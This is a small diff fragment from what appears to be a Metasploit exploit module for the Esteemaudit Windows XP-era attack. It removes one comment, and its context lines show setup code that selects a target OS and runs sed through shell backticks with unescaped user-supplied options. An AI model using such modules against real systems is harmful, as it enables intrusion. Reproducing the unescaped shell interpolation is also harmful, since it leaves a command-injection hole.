@@ -73,7 +73,6 @@ class MetasploitModule < Msf::Exploit::Remote
   sed = `sed -i 's|%WINEPATH%|#{datastore['WINEPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   
-  #WIN72K8R2 (6-8) and XP (0-5)
   if target.name =~ /Windows XP SP0/
 	objective = "XPSP0"
   elsif target.name =~ /Windows XP SP1/
